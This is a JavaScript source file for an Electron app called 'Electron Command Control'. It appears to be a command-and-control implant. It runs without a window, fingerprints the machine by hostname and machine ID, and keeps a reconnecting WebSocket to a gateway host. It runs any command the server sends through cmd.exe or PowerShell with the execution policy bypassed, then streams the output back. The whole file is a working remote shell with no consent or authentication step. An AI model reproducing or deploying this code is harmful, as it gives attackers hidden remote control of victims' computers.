/*

Electron Command Control 
author : aswin / 00nx

*/


import { app } from "electron";
app.disableHardwareAcceleration();


app.whenReady().then(() => {
  connect();
});

app.on("window-all-closed", () => {});

app.on("before-quit", () => {
  if (ws) ws.close();
  if (reconnectTimeout) clearTimeout(reconnectTimeout);
  if (pingInterval) clearInterval(pingInterval);
});











import WebSocket from "ws";
import os, { type } from "os";
import  machineId   from "node-machine-id";
import fs from "fs/promises";
import { fileURLToPath } from "url"
import path from "path"
import { exec, spawn  } from "child_process";
import { promisify } from "util";


// package altering for commonjs only 

const { machineIdSync  } = machineId;
const execprom = promisify(exec);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const pkgPath = path.join(app.getAppPath(), "package.json");

const pkg = JSON.parse(
  await fs.readFile(pkgPath, "utf-8")
);


// globals

const GATEWAY_URL = pkg.config?.gateway;
const hostname = os.hostname();
const uuid = machineIdSync({ original: true })
  .replace(/[^a-z0-9]/gi, "")
  .slice(0, 32);




// defining commonly used variables


let ws = null;
let pingInterval = null;
let reconnectTimeout = null;
let reconnectDelayMs = 2000;




// MAIN LOGIC from here


function cleanup() {

  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }

  if (ws) {
    try {
      ws.removeAllListeners();
      ws = null;
    } catch {}
  }
}



function connect() {
  console.log(`Connecting -> ${GATEWAY_URL} `);

  ws = new WebSocket(GATEWAY_URL);

ws.on("open", () => {
    console.log("[open] Connected");
    reconnectDelayMs = 2000;

    ws.send(
      JSON.stringify({
        type: "register",
        uuid,
        hostname,
      })
    );

    pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(
          JSON.stringify({
            type: "ping",
            uuid,
          })
        );
      }
    }, 25_000);
  });


ws.on("message", (data) => {
    try {
    const msg = JSON.parse(data.toString());
    if(msg.type === "run" && msg.command && msg.shell){
    runcmd(msg.command, msg.shell);
    }

    } catch (e) {
      console.error("invalid message format", e);
    }

});


ws.on("close", () => {
    console.log("[close] Disconnected  -> reconnecting...");
    cleanup();
    scheduleReconnect();
  });

ws.on("error", (err) => {
    console.error("[error]", err.message);
    ws.close();
  });
}


/**
 * 
 * @param {string} command 
 * @param {string} shell 
 */


function runcmd(command, shell = "cmd") {

  if (!ws || ws.readyState !== WebSocket.OPEN) {
    console.error("WebSocket not connected");
    return;
  }


  let proc;


  if (shell === "ps" || shell === "powershell") {

    proc = spawn("powershell.exe", [
      "-NoProfile",
      "-ExecutionPolicy", "Bypass",
      "-Command",
      command
    ]);

  } else {

    // CMD
    proc = spawn("cmd.exe", [
      "/c",
      command
    ]);
  }


  let stdout = "";
  let stderr = "";


  /* CAPTURE STREAM */

  proc.stdout.on("data", (data) => {
    stdout += data.toString();

    sendChunk(data.toString());
  });


  proc.stderr.on("data", (data) => {
    stderr += data.toString();

    sendChunk("[ERR] " + data.toString());
  });


  proc.on("close", (code) => {

    const output = {
      stdout: stdout.trim(),
      stderr: stderr.trim(),
      success: code === 0,
      command,
      shell,
      exitCode: code
    };


    ws.send(JSON.stringify({

      type: "message",

      payload: {

        type: "command_output",

        command,
        shell,

        output,

        timestamp: Date.now()
      }
    }));
  });


  proc.on("error", (err) => {

    ws.send(JSON.stringify({

      type: "message",

      payload: {

        type: "command_output",

        command,
        shell,

        output: {
          stdout: "",
          stderr: err.message,
          success: false,
          command,
          shell
        },

        timestamp: Date.now()
      }
    }));
  });
}


/* ============================
   LIVE CHUNK SENDER
============================ */

function sendChunk(text) {

  ws.send(JSON.stringify({

    type: "message",

    payload: {

      type: "command_stream",

      data: text,

      timestamp: Date.now()
    }
  }));
}





  /* helper functions */

function scheduleReconnect() {
  if (reconnectTimeout) clearTimeout(reconnectTimeout);

  reconnectTimeout = setTimeout(() => {
    connect();

    reconnectDelayMs = Math.min(
      reconnectDelayMs * 1.8,
      60_000
    );
  }, reconnectDelayMs);
}